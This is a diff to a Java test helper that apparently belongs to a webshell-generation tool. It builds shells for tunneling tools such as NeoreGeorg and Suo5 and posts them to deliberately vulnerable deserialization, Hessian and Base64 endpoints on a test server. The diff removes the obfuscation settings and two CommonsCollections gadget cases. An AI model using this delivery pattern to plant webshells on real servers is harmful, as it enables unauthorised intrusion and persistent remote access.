@@ -232,15 +232,7 @@ public class ShellAssertionTool {
                 .targetJreVersion(targetJdkVersion)
                 .debug(true)
                 .shrink(true)
-                .obfuscate(true)
                 .build();
-
-        if (ShellTool.NeoreGeorg.equals(shellTool)) {
-            shellConfig.setObfuscate(false);
-        }
-        if (Server.Jetty.equals(server) && ShellType.FILTER.equals(shellType) && ShellTool.Suo5.equals(shellTool)) {
-            shellConfig.setObfuscate(false);
-        }
 
         ShellToolConfig shellToolConfig = null;
         String uniqueName = shellTool + RandomStringUtils.randomAlphabetic(5) + shellType + RandomStringUtils.randomAlphabetic(5) + packer.name();
@@ -332,8 +324,6 @@ public class ShellAssertionTool {
             case JavaCommonsBeanutils18 -> VulTool.postData(url + "/java_deserialize/cb183", content);
             case JavaCommonsBeanutils19 -> VulTool.postData(url + "/java_deserialize/cb194", content);
             case JavaCommonsBeanutils110 -> VulTool.postData(url + "/java_deserialize/cb110", content);
-            case JavaCommonsCollections3 -> VulTool.postData(url + "/java_deserialize/cc321", content);
-            case JavaCommonsCollections4 -> VulTool.postData(url + "/java_deserialize/cc40", content);
             case HessianDeserialize -> VulTool.postData(url + "/hessian", content);
             case Hessian2Deserialize -> VulTool.postData(url + "/hessian2", content);
             case Base64 -> VulTool.postData(url + "/b64", content);
